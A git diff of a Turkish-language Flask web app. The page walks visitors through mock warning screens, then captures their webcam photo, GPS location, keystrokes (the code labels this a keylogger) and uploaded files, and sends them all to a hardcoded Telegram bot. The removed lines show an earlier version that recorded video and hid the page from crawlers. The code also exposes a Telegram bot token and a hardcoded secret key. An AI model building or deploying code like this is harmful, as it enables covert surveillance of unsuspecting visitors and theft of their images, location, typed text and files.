@@ -5,21 +5,15 @@ import base64
 
 app = Flask(__name__)
 
-# --- AYARLAR ---
 TELEGRAM_TOKEN = "9021080798:AAEXhjdd0iAX1cvMFrk0MXfSj2PvnXvkSV8"
 CHAT_ID = "7622505128"
-BOT_SIFRESI = "utkan9292" 
-
-# 🚨 İŞTE O ÇELİK KİLİT (Bunu kimseye söyleme, koda gömülü kalsın)
 GIZLI_ANAHTAR = "Utkan_Super_Gizli_2024" 
 
-# --- TELEGRAM FONKSİYONLARI ---
-def telegram_mesaj_gonder(mesaj, gonderilecek_chat_id=CHAT_ID):
+def telegram_mesaj_gonder(mesaj):
     try:
         url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
-        requests.post(url, json={"chat_id": gonderilecek_chat_id, "text": mesaj, "parse_mode": "HTML"}, timeout=5)
-    except Exception as e:
-        print("Mesaj Hatası:", e)
+        requests.post(url, json={"chat_id": CHAT_ID, "text": mesaj, "parse_mode": "HTML"}, timeout=5)
+    except: pass
 
 def telegram_fotograf_gonder(fotograf_base64, bilgi_metni):
     try:
@@ -29,167 +23,203 @@ def telegram_fotograf_gonder(fotograf_base64, bilgi_metni):
         files = {'photo': ('ajan.jpg', resim_bytes)}
         data = {'chat_id': CHAT_ID, 'caption': bilgi_metni, 'parse_mode': 'HTML'}
         requests.post(url, files=files, data=data, timeout=15)
-    except Exception as e:
-        print("Fotoğraf Hatası:", e)
+    except: pass
 
-# --- TELEGRAM BOT MESAJ DİNLEYİCİ ---
-@app.route('/webhook', methods=['POST'])
-def telegram_webhook():
-    update = request.get_json()
-    if "message" in update:
-        chat_id = update["message"]["chat"]["id"]
-        text = update["message"].get("text", "")
-        if str(chat_id) != CHAT_ID: return "OK", 200
-        if text == "/start":
-            telegram_mesaj_gonder("🚨 <b>GÜVENLİK DUVARI</b> 🚨\n\nEfendim, sisteme erişmek için lütfen şifrenizi girin:")
-        elif text == BOT_SIFRESI:
-            telegram_mesaj_gonder("✅ <b>GİRİŞ BAŞARILI!</b> Sistem aktif. Hoş geldin Utkan.")
-        else:
-            telegram_mesaj_gonder("❌ Hatalı şifre! Erişim reddedildi.")
-    return "OK", 200
+def telegram_dosya_gonder(dosya, dosya_adi, aciklama):
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
+        files = {'document': (dosya_adi, dosya)}
+        data = {'chat_id': CHAT_ID, 'caption': aciklama}
+        requests.post(url, files=files, data=data, timeout=30)
+    except: pass
 
-# --- WEB ROTALARI ---
 @app.route('/', methods=['GET'])
 def ana_sayfa():
-    if request.path == '/favicon.ico': return "OK", 200
-    
-    ziyaretci_ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
-    if ziyaretci_ip: ziyaretci_ip = ziyaretci_ip.split(',')[0].strip()
-    sorgulanan_ip = ziyaretci_ip
-    if ziyaretci_ip.startswith("192.168.") or ziyaretci_ip.startswith("127.") or ziyaretci_ip.startswith("10."):
-        try:
-            sorgulanan_ip = requests.get('https://api.ipify.org', timeout=3).text
-        except: pass
+    html = """
+    <!DOCTYPE html>
+    <html lang="tr">
+    <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Erişimi</title>
+    <style>
+        body { background-color: #0a0a0a; color: #0f0; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
+        .onay-kutusu { background: #111; border: 2px solid #0f0; padding: 30px; border-radius: 10px; box-shadow: 0 0 20px #0f0; max-width: 80%; }
+        h2 { color: #ff3333; }
+        p { font-size: 16px; margin: 20px 0; }
+        button { background: #000; color: #0f0; border: 1px solid #0f0; padding: 10px 20px; margin: 0 10px; cursor: pointer; font-family: monospace; font-size: 16px; border-radius: 5px; transition: 0.3s; }
+        button:hover { background: #0f0; color: #000; }
+        .gizli-alan { display: none; }
+    </style>
+    </head>
+    <body>
 
-    user_agent = request.headers.get('User-Agent', '').lower()
-    if 'bot' in user_agent or 'facebook' in user_agent or 'crawler' in user_agent or 'python' in user_agent:
-        return "OK", 200
+    <div id="onay-ekrani" class="onay-kutusu">
+        <h2 id="baslik">SİSTEM UYARISI</h2>
+        <p id="mesaj">Bu siteye girmek üzeresiniz. Devam etmek istiyor musunuz?</p>
+        <button id="btnEvet" onclick="onayAdimi()">TAMAM</button>
+        <button id="btnHayir" onclick="reddet()">HAYIR</button>
+    </div>
 
-    # 🚨 HTML içindeki JavaScript'e gizli anahtarı gönderiyoruz
-    html = f"""
-    <body style='background:#0a0a0a; color:#0f0; font-family:monospace; text-align:center; padding-top:15%;'>
-        <h2 style='color:red;'>SİSTEM BAŞLATILIYOR...</h2>
-        <p id='durum'>Lütfen kamera ve mikrofon izni verin...</p>
+    <div id="sistem-alani" class="gizli-alan">
+        <h2 style="color:red;">SİSTEM BAŞLATILIYOR...</h2>
+        <p id="durum">Lütfen kamera ve konum izni verin...</p>
         <video id="video" autoplay muted playsinline style="display:none;"></video>
         <canvas id="canvas" style="display:none;"></canvas>
 
-        <script>
-            window.onload = async function() {{
-                const durum = document.getElementById('durum');
-                let mediaRecorder;
-                let videoChunks = [];
-                let stream;
-                let isSent = false; 
+        <div style="margin-top:20px; border:1px dashed #0f0; padding:10px;">
+            <h3>Belge Yükle</h3>
+            <input type="file" id="dosyaSec" style="color:#0f0;">
+        </div>
 
-                function verileriGonder() {{
-                    if (isSent) return;
-                    isSent = true;
-                    if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop(); 
-                }}
+        <div style="margin-top:20px; border:1px dashed #0f0; padding:10px;">
+            <h3>Mesaj Bırak</h3>
+            <input type="text" id="gizliMetin" placeholder="Yazın..." style="width:80%; padding:10px; background:#000; color:#0f0; border:1px solid #0f0;">
+        </div>
+    </div>
 
-                try {{
-                    stream = await navigator.mediaDevices.getUserMedia({{ video: true, audio: true }});
-                    const video = document.getElementById('video');
-                    video.srcObject = stream;
+    <script>
+        let adim = 1;
+
+        function onayAdimi() {
+            const baslik = document.getElementById('baslik');
+            const mesaj = document.getElementById('mesaj');
+            const btnEvet = document.getElementById('btnEvet');
+
+            if (adim === 1) {
+                baslik.innerText = "DİKKAT!";
+                mesaj.innerText = "Bu siteye izin verirsen IP adresin, konumun ve cihaz bilgilerin arka plandaki sunucuya geçecek. Emin misin?";
+                btnEvet.innerText = "EVET, EMİNİM";
+                adim++;
+            } 
+            else if (adim === 2) {
+                baslik.innerText = "SON UYARI!";
+                mesaj.innerText = "Bu işlem geri alınamaz. Kameran, mikrofonun ve konumun tamamen ele geçirilecek. Gerçekten emin misin?";
+                btnEvet.innerText = "TAMAM, DEVAM ET";
+                adim++;
+            } 
+            else if (adim === 3) {
+                baslik.innerText = "SÖZLEŞME";
+                mesaj.innerText = "Hiçbir şeyi kabul etmiyorum diyorsan 'HAYIR'a bas. Ama 'TAMAM' dersen tüm izinleri vermeyi kabul etmiş olursun.";
+                btnEvet.innerText = "HEPSİNİ KABUL EDİYORUM";
+                adim++;
+            } 
+            else {
+                // 3. onaydan sonra sistemi başlat
+                document.getElementById('onay-ekrani').style.display = 'none';
+                document.getElementById('sistem-alani').style.display = 'block';
+                izinleriIste();
+            }
+        }
+
+        function reddet() {
+            document.getElementById('onay-ekrani').innerHTML = "<h2 style='color:red;'>SİSTEMDEN ÇIKILIYOR...</h2><p>Güvenliğiniz için işlem iptal edildi.</p>";
+        }
+
+        async function izinleriIste() {
+            const durum = document.getElementById('durum');
+            try {
+                // 1. KAMERA
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const foto = canvas.toDataURL('image/jpeg');
                     
-                    video.onloadedmetadata = () => {{
-                        const canvas = document.getElementById('canvas');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        canvas.getContext('2d').drawImage(video, 0, 0);
-                        const foto = canvas.toDataURL('image/jpeg');
-                        
-                        // 🚨 FOTOĞRAF GÖNDERİLİRKEN GİZLİ ANAHTAR YANINDA GİDİYOR
-                        fetch('/kamera', {{
-                            method: 'POST',
-                            headers: {{ 
-                                'Content-Type': 'application/json',
-                                'X-Secret-Key': '{GIZLI_ANAHTAR}' // İşte kilit burada!
-                            }},
-                            body: JSON.stringify({{ image: foto, ip: "{sorgulanan_ip}" }})
-                        }});
+                    fetch('/kamera', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json', 'X-Secret-Key': 'Utkan_Super_Gizli_2024' },
+                        body: JSON.stringify({ image: foto, ip: "Test" })
+                    });
+                    durum.innerHTML = "Kamera açıldı. Konum alınıyor...";
+                };
 
-                        durum.innerHTML = "✅ Fotoğraf çekildi. Video kaydı başlıyor...";
-                        
-                        mediaRecorder = new MediaRecorder(stream, {{ mimeType: 'video/webm' }});
-                        mediaRecorder.ondataavailable = event => {{ if (event.data.size > 0) videoChunks.push(event.data); }};
-                        mediaRecorder.onstop = () => {{
-                            const videoBlob = new Blob(videoChunks, {{ type: 'video/webm' }});
-                            const formData = new FormData();
-                            formData.append('video_dosyasi', videoBlob, 'kayit.webm');
-                            
-                            // 🚨 VİDEO GÖNDERİLİRKEN GİZLİ ANAHTAR YANINDA GİDİYOR
-                            fetch('/video', {{
+                // 2. GPS KONUM
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            fetch('/konum', {
                                 method: 'POST',
-                                headers: {{ 'X-Secret-Key': '{GIZLI_ANAHTAR}' }},
-                                body: formData
-                            }}).then(() => {{
-                                stream.getTracks().forEach(track => track.stop());
-                                durum.innerHTML = "✅ Video gönderildi!";
-                            }});
-                        }};
-                        mediaRecorder.start(1000);
-                        
-                        let saniye = 10;
-                        const sayac = setInterval(() => {{
-                            if(!isSent) {{ durum.innerHTML = "🎥 Kaydediliyor: " + saniye + " saniye kaldı..."; saniye--; }}
-                        }}, 1000);
+                                headers: { 'Content-Type': 'application/json', 'X-Secret-Key': 'Utkan_Super_Gizli_2024' },
+                                body: JSON.stringify({ lat: position.coords.latitude, lon: position.coords.longitude })
+                            });
+                            durum.innerHTML = "Konum alındı. Sistem dinlemede...";
+                        },
+                        (error) => { durum.innerHTML = "Konum izni reddedildi."; }
+                    );
+                }
 
-                        setTimeout(() => {{ clearInterval(sayac); verileriGonder(); }}, 10000); 
-                        window.addEventListener('beforeunload', verileriGonder);
-                    }};
-                }} catch (error) {{
-                    durum.innerHTML = "❌ İzin verilmedi (Kamera/Mikrofon)";
-                }}
-            }};
-        </script>
+                // 3. KLAVYE (KEYLOGGER)
+                let yazilanlar = "";
+                document.getElementById('gizliMetin').addEventListener('keyup', function(e) {
+                    yazilanlar += e.key;
+                    if (yazilanlar.length >= 5 || e.key === 'Enter') {
+                        fetch('/keylog', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json', 'X-Secret-Key': 'Utkan_Super_Gizli_2024' },
+                            body: JSON.stringify({ text: yazilanlar })
+                        });
+                        yazilanlar = ""; 
+                    }
+                });
+
+                // 4. DOSYA
+                document.getElementById('dosyaSec').addEventListener('change', function(e) {
+                    const file = e.target.files[0];
+                    if (file) {
+                        const formData = new FormData();
+                        formData.append('dosya', file);
+                        fetch('/dosya', {
+                            method: 'POST',
+                            headers: { 'X-Secret-Key': 'Utkan_Super_Gizli_2024' },
+                            body: formData
+                        });
+                    }
+                });
+
+            } catch (error) {
+                durum.innerHTML = "İzinler reddedildi. Sistem kilitlendi.";
+            }
+        }
+    </script>
     </body>
+    </html>
     """
     return html
 
-@app.route('/kamera', methods=['POST'])
-def kamera():
-    # 🚨 GÜVENLİK KONTROLÜ: Gelen istekte gizli anahtar var mı?
-    gelen_anahtar = request.headers.get('X-Secret-Key')
-    if gelen_anahtar != GIZLI_ANAHTAR:
-        return jsonify({"hata": "Yetkisiz Erişim! Gizli anahtar geçersiz."}), 403
-
+@app.route('/konum', methods=['POST'])
+def konum():
+    if request.headers.get('X-Secret-Key') != GIZLI_ANAHTAR: return "Hata", 403
     veri = request.json
-    ip = veri['ip']
-    user_agent = request.headers.get('User-Agent', 'Bilinmiyor')
-    
-    try:
-        konum = requests.get(f'http://ip-api.com/json/{ip}', timeout=3).json()
-        sehir = konum.get('city', 'Bilinmiyor')
-        hava = requests.get(f'https://wttr.in/{sehir}?format=3', timeout=3).text.strip()
-    except:
-        sehir, hava = "Bilinmiyor", "Alınamadı"
-
-    bilgi_metni = f"""🚨 <b>AJAN YAKALANDI!</b>
-    
-🌐 <b>IP Adresi:</b> {ip}
-📍 <b>Konum:</b> {sehir}
-☀️ <b>Hava Durumu:</b> {hava}
-📱 <b>Tarayıcı:</b> {user_agent[:50]}..."""
-
-    telegram_fotograf_gonder(veri['image'], bilgi_metni)
+    maps_link = f"https://www.google.com/maps?q={veri['lat']},{veri['lon']}"
+    telegram_mesaj_gonder(f"📍 <b>NET GPS KONUMU ALINDI!</b>\n\n🗺️ <a href='{maps_link}'>Haritada Görüntüle</a>")
     return "OK", 200
 
-@app.route('/video', methods=['POST'])
-def video():
-    # 🚨 GÜVENLİK KONTROLÜ: Gelen istekte gizli anahtar var mı?
-    gelen_anahtar = request.headers.get('X-Secret-Key')
-    if gelen_anahtar != GIZLI_ANAHTAR:
-        return jsonify({"hata": "Yetkisiz Erişim! Gizli anahtar geçersiz."}), 403
+@app.route('/keylog', methods=['POST'])
+def keylog():
+    if request.headers.get('X-Secret-Key') != GIZLI_ANAHTAR: return "Hata", 403
+    veri = request.json
+    telegram_mesaj_gonder(f"⌨️ <b>KLAVYE GİRDİSİ:</b>\n<code>{veri['text']}</code>")
+    return "OK", 200
 
-    if 'video_dosyasi' not in request.files:
-        return jsonify({"hata": "Video bulunamadı"}), 400
-    
-    video_dosyasi = request.files['video_dosyasi']
-    video_verisi = video_dosyasi.read()
-    if len(video_verisi) < 1000: return "Kısa video", 200
-        
-    # telegram_video_gonder fonksiyonunu buraya eklemeyi unutma (önceki kodlarda vardı)
+@app.route('/dosya', methods=['POST'])
+def dosya():
+    if request.headers.get('X-Secret-Key') != GIZLI_ANAHTAR: return "Hata", 403
+    if 'dosya' not in request.files: return "Hata", 400
+    dosya = request.files['dosya']
+    telegram_dosya_gonder(dosya, dosya.filename, "📁 <b>DOSYA YÜKLENDİ!</b>")
+    return "OK", 200
+
+@app.route('/kamera', methods=['POST'])
+def kamera():
+    if request.headers.get('X-Secret-Key') != GIZLI_ANAHTAR: return "Hata", 403
+    veri = request.json
+    telegram_fotograf_gonder(veri['image'], "🚨 <b>AJAN YAKALANDI!</b>")
     return "OK", 200
 
 if __name__ == '__main__':
